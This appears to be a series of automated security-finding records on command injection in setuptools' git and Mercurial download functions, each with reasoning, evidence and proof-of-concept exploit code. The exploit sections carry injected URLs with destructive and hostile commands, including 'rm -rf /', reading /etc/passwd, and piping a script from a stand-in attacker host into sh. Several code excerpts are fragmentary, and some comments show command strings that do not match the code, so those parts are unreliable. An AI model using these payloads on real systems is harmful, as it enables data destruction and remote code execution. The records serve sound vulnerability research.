findings.description: Command injection in git clone via os.system with user-controlled URL
findings.code_snippet:
def _download_git(self, url, filename):
        filename = filename.split('#', 1)[0]
        url, rev = self._vcs_split_rev_from_url(url, pop_prefix=True)

        self.info("Doing git clone from %s to %s", url, filename)
        os.system("git clone --quiet %s %s" % (url, filename))

        if rev is not None:
            self.info("Checking out %s", rev)
            os.system(
                "git -C %s checkout --quiet %s"
                % (
                    filename,
                    rev,
                )
            )

        return filename
findings.reasoning: The _download_git method uses os.system() with string formatting that directly incorporates user-controlled URL and revision parameters without proper sanitization or escaping. An attacker can craft a malicious URL containing shell metacharacters (e.g., '; rm -rf /; #') to execute arbitrary commands. The filename is derived from the URL via egg_info_for_url but still contains user-controlled content. This is a classic command injection vulnerability where untrusted input flows into shell commands without proper quoting.

evidence.code_context:
def _download_git(self, url, filename):
    filename = filename.split('#', 1)[0]
    url, rev = self._vcs_split_rev_from_url(url, pop_prefix=True)

    self.info("Doing git clone from %s to %s", url, filename)
    os.system("git clone --quiet %s %s" % (url, filename))

    if rev is not None:
        self.info("Checking out %s", rev)
        os.system(
            "git -C %s checkout --quiet %s"
            % (
                filename,
                rev,
            )
        )

    return filename
evidence.dataflow_analysis: The URL parameter comes from the download() method which accepts user input as 'spec' parameter. The spec can be a URL string that flows through _download_url() to _download_git(). The URL is user-controlled and flows directly into os.system() call without sanitization.
evidence.notes: This is a true command injection vulnerability with high severity because it allows arbitrary command execution when processing malicious git URLs. The attack scenario is relevant for package installation from untrusted sources.

exploit_payload.code_snippet:
import setuptools.package_index
import tempfile
import os

# Create a malicious URL with command injection
# The URL will be processed by _download_git()
# Using ';' to separate commands and '#' to comment out rest of line
malicious_url = "git+https://example.com/repo.git; echo 'EXPLOITED' > /tmp/pwned; #"

# Create PackageIndex instance
pi = setuptools.package_index.PackageIndex()

# Create temporary directory
with tempfile.TemporaryDirectory() as tmpdir:
    try:
        # This will trigger the command injection
        result = pi.download(malicious_url, tmpdir)
    except Exception as e:
        # Command injection will execute: echo 'EXPLOITED' > /tmp/pwned
        print(f"Exploit executed: Check /tmp/pwned file")
        
# Alternative more dangerous payload:
# malicious_url = "git+https://example.com/repo.git; rm -rf /tmp/important; #"
exploit_payload.scenario: Attacker supplies malicious git URL with shell metacharacters to trigger arbitrary command execution during package download
exploit_payload.prerequisites: Requires ability to specify git repository URL for download (e.g., pip install git+<malicious_url>)

findings.description: Command injection in git download via os.system with URL string formatting
findings.reasoning: The code uses os.system() with string formatting to execute a git clone command. The URL parameter is directly interpolated into the shell command string without proper sanitization or escaping. An attacker who controls the URL (e.g., from a malicious package repository) can inject shell metacharacters to execute arbitrary commands. For example, a URL like 'https://example.com/repo.git; rm -rf /tmp/test' would execute the rm command after the git clone. The filename parameter is also vulnerable but is derived from the URL via egg_info_for_url() and may be sanitized to some extent.

evidence.code_context:
def _download_git(self, url, filename):
        filename = filename.split('#', 1)[0]
        url, rev = self._vcs_split_rev_from_url(url, pop_prefix=True)

        self.info("Doing git clone from %s to %s", url, filename)
        os.system("git clone --quiet %s %s" % (url, filename))

        if rev is not None:
            self.info("Checking out %s", rev)
            os.system(
                "git -C %s checkout --quiet %s"
                % (
                    filename,
                    rev,
                )
            )

        return filename
evidence.dataflow_analysis: No dataflow tracing performed; direct inspection shows URL parameter flows into os.system call.
evidence.notes: The vulnerability exists because os.system() interprets the entire string as a shell command. The URL is formatted directly into the command string without any quoting or escaping. The _vcs_split_rev_from_url method splits URL and revision but does not sanitize for shell metacharacters.

exploit_payload.code_snippet:
# Exploit: malicious URL with command injection
# Attacker controls URL parameter (e.g., from malicious package index)
malicious_url = "https://example.com/repo.git; echo 'malicious command' > /tmp/exploit.txt"
# When _download_git is called with this URL:
# os.system("git clone --quiet https://example.com/repo.git; echo 'malicious command' > /tmp/exploit.txt %s" % (malicious_url, filename))
# This executes: git clone --quiet https://example.com/repo.git; echo 'malicious command' > /tmp/exploit.txt <filename>
# The semicolon terminates the git command and executes arbitrary shell command.

# More dangerous example:
dangerous_url = "https://example.com/repo.git; rm -rf /tmp/important_data; curl http://attacker.com/steal.sh | sh"
# This could delete data and download/execute arbitrary code from attacker's server.
exploit_payload.scenario: Attacker publishes a malicious package with crafted git repository URL containing shell metacharacters; when setuptools downloads the package via git, arbitrary commands are executed on the victim's system.
exploit_payload.prerequisites: Attacker must be able to influence the git repository URL that setuptools attempts to clone (e.g., via malicious package index or direct specification).

findings.description: Command injection via os.system with unsanitized URL in git clone command
findings.reasoning: The _download_hg method uses os.system with string formatting to construct a shell command with the URL parameter. If an attacker can control the URL (e.g., via a malicious package repository), they can inject shell metacharacters to execute arbitrary commands. The URL is not sanitized before being inserted into the shell command string. This is a classic command injection vulnerability (CWE-78) and also relates to improper control of code generation (CWE-94)."

evidence.code_context:
def _download_hg(self, url, filename):
        filename = filename.split('#', 1)[0]
        url, rev = self._vcs_split_rev_from_url(url, pop_prefix=True)

        self.info("Doing hg clone from %s to %s", url, filename)
        os.system("hg clone --quiet %s %s" % (url, filename))

        if rev is not None:
            self.info("Updating to %s", rev)
            os.system(
                "hg --cwd %s up -C -r %s -q"
                % (
                    filename,
                    rev,
                )
            )

        return filename
evidence.dataflow_analysis: No dataflow analysis performed - direct code inspection shows URL parameter from method argument is used directly in os.system() call.
evidence.notes: The URL parameter comes from the method argument which ultimately comes from user-controlled input (package URLs). No sanitization or escaping is applied before using it in the shell command.

import setuptools.package_index

# Create malicious URL with command injection

malicious_url = "https://example.com/repo; rm -rf /tmp/test; echo 'injected'"
filename = "/tmp/clone_dir"

# Or using $(command) syntax
# malicious_url = "https://example.com/repo && cat /etc/passwd > /tmp/leak"

findings.description: Command injection via URL parameter in git clone command
findings.reasoning: The URL parameter is directly interpolated into a shell command via os.system() without any sanitization or escaping. An attacker controlling the URL can inject shell metacharacters to execute arbitrary commands. This occurs in the _download_git method which is called when downloading packages with git:// or git+ URLs.

    url, rev = self._vcs_split_rev_from_url(url, pop_prefix=True)

    self.info("Doing git clone from %s to %s", url, filename)
    os.system("git clone --quiet %s %s" % (url, filename))

        os.system(

                filename,
                rev,
            )

    return filename
evidence.dataflow_analysis: The URL comes from the _download_url method which is called with user-controlled package URLs. The URL flows directly into the shell command without sanitization.
evidence.notes: This is a clear command injection vulnerability. The os.system() call with string formatting allows shell metacharacters in the URL to execute arbitrary commands.

exploit_payload.code_snippet:
import os
# Attacker-controlled malicious URL that triggers command injection
# Example: git://example.com/; touch /tmp/pwned; echo
malicious_url = "git://example.com/; touch /tmp/pwned; echo"
# When _download_git is called with this URL, it executes:
# os.system("git clone --quiet git://example.com/; touch /tmp/pwned; echo %s" % (filename))
# This would execute "touch /tmp/pwned" as a shell command
# Actual attack scenario: Attacker publishes a package with malicious git URL,
# when user installs it, arbitrary code executes during download.
exploit_payload.scenario: Attacker publishes a package with malicious git URL containing shell metacharacters that trigger command execution during package download
exploit_payload.prerequisites: User installs package from untrusted source with git:// or git+ URL

findings.description: Command injection via unescaped URL parameters in git/hg download functions
findings.code_snippet:
self.info("Doing git clone from %s to %s", url, filename)
        os.system("git clone --quiet %s %s" % (url, filename))

        if rev is not None:

    def _download_hg(self, url, filename):
        filename = filename.split('#', 1)[0]
        url, rev = self._vcs_split_rev_from_url(url, pop_prefix=True)

        self.info("Doing hg clone from %s to %s", url, filename)

                    rev,
                )

findings.reasoning: Multiple command injection vulnerabilities in git and hg download functions. The code uses os.system() with string formatting directly inserting URL and revision parameters into shell commands without proper escaping. An attacker can craft malicious URLs with shell metacharacters (e.g., '; rm -rf /') to execute arbitrary commands. The vulnerable locations are: line 886 (git clone), lines 890-896 (git checkout), line 905 (hg clone), lines 909-915 (hg update). URLs come from package specifications and can be controlled by attackers setting up malicious package repositories.

evidence.code_context: Lines 880-920 show both _download_git and _download_hg functions using os.system() with direct string formatting of URL and revision parameters. The _download_url function at line 817 calls these methods based on URL scheme. URLs come from package specifications processed by scan_url and process_url methods. The _vcs_split_rev_from_url method parses URL but doesn't sanitize for shell safety.
evidence.dataflow_analysis: 1. User/attacker provides package URL (e.g., 'git+https://example.com/malicious.git;rm -rf /#@rev') in package specification. 2. _download_url is called with URL. 3. For git/hg schemes, _download_git or _download_hg is invoked. 4. _vcs_split_rev_from_url splits URL and revision. 5. os.system() executes shell command with unsanitized URL and revision parameters. Shell interprets metacharacters leading to arbitrary command execution.
evidence.notes: All 4 CodeQL results correspond to these 4 os.system() calls with string formatting. The vulnerability is consistent across all calls: direct string interpolation into shell commands without escaping.

exploit_payload.code_snippet:
import setuptools.package_index

# Create malicious package index
pi = setuptools.package_index.PackageIndex()

# Exploit 1: git clone with command injection
# The semicolon separates git command from malicious command
malicious_url = "git+https://example.com/legit.git;touch /tmp/exploited1;echo"

# Exploit 2: git checkout with command injection in revision
# Revision parameter can also contain shell metacharacters
malicious_url_with_rev = "git+https://example.com/legit.git#@rev;touch /tmp/exploited2;echo"

# Exploit 3: hg clone with command injection
malicious_hg_url = "hg+https://example.com/legit.hg;touch /tmp/exploited3;echo"

# Exploit 4: hg update with command injection in revision
malicious_hg_with_rev = "hg+https://example.com/legit.hg#@rev;touch /tmp/exploited4;echo"

# When these URLs are processed by _download_url, they trigger os.system() calls
# Shell interprets the semicolons and executes arbitrary commands
# Example actual execution:
# os.system("git clone --quiet https://example.com/legit.git;touch /tmp/exploited1;echo /tmp/somefile")
# This runs both git clone AND malicious touch command
exploit_payload.scenario: Attacker creates malicious package repository with crafted URL containing shell metacharacters; when victim installs package, arbitrary commands execute during git/hg clone operations
exploit_payload.prerequisites: Victim installs package from attacker-controlled repository URL

findings.description: Command injection in git checkout via unsanitized revision parameter in package index download
findings.reasoning: The 'rev' parameter from URL fragment is directly interpolated into a shell command without any sanitization. An attacker can provide a malicious revision string containing shell metacharacters (e.g., '; rm -rf /') to execute arbitrary commands. The rev parameter comes from URL parsing in _vcs_split_rev_from_url which extracts revision after '@' symbol in the URL path, allowing user-controlled input to reach os.system().

evidence.code_context:
def _download_git(self, url, filename):
        filename = filename.split('#', 1)[0]
        url, rev = self._vcs_split_rev_from_url(url, pop_prefix=True)

        self.info("Doing git clone from %s to %s", url, filename)
        os.system("git clone --quiet %s %s" % (url, filename))

        if rev is not None:
            self.info("Checking out %s", rev)
            os.system(
                "git -C %s checkout --quiet %s"
                % (
                    filename,
                    rev,
                )
            )
evidence.dataflow_analysis: The rev parameter comes from _vcs_split_rev_from_url() which parses URLs and extracts revision after '@' symbol. This URL is user-controlled when package index downloads from external repositories. The rev is then directly interpolated into os.system() call without any sanitization or escaping.
evidence.notes: Both git clone and git checkout commands are vulnerable. The git checkout command is particularly dangerous as it accepts the rev parameter directly in shell command.

exploit_payload.code_snippet:
# Exploit: Malicious git URL with command injection in revision
# Example: git+https://example.com/repo.git@;rm -rf /;#
# The URL parser extracts ';rm -rf /;' as the revision
# When _download_git is called with this URL:
# os.system("git -C /tmp/some_dir checkout --quiet ;rm -rf /;")
# This executes 'rm -rf /' after git checkout

# Full attack scenario:
# 1. Attacker hosts malicious package with download URL containing command injection
# 2. User installs package via setuptools/package_index
# 3. Package index calls _download_git with attacker-controlled URL
# 4. Command injection executes arbitrary shell commands
exploit_payload.scenario: Attacker provides malicious git URL with shell metacharacters in revision parameter to execute arbitrary commands during package download
exploit_payload.prerequisites: Ability to specify package download URL (e.g., in requirements.txt or setup.py)

findings.description: Command injection in hg clone via URL parameter in package_index.py
findings.reasoning: The URL parameter is directly interpolated into a shell command using string formatting without proper sanitization or escaping. An attacker can inject shell metacharacters into the URL to execute arbitrary commands. The URL comes from user-controlled input via package download URLs.

evidence.code_context:
def _download_hg(self, url, filename):
        filename = filename.split('#', 1)[0]
        url, rev = self._vcs_split_rev_from_url(url, pop_prefix=True)

        self.info("Doing hg clone from %s to %s", url, filename)
        os.system("hg clone --quiet %s %s" % (url, filename))
evidence.dataflow_analysis: URL flows from _download_url() method which processes package URLs from user input. The URL is passed to _download_hg() and directly used in os.system() call.
evidence.notes: Similar vulnerability to git clone but for Mercurial. No sanitization of URL before shell command execution.

exploit_payload.code_snippet:
Malicious URL: hg+http://example.com/repo'; rm -rf /; echo ' 

Attack: Package index processes a maliciously crafted hg+ URL containing shell metacharacters. Example: hg+http://attacker.com/'; cat /etc/passwd; echo 'test

When setuptools attempts to download this package, it will execute: os.system("hg clone --quiet 'http://attacker.com/'; cat /etc/passwd; echo 'test' /tmp/filename")
exploit_payload.scenario: Attacker publishes a malicious package with a crafted hg+ URL containing shell metacharacters, triggering arbitrary command execution when setuptools downloads it
exploit_payload.prerequisites: Requires setuptools to process a malicious package URL (e.g., from PyPI or custom package index)
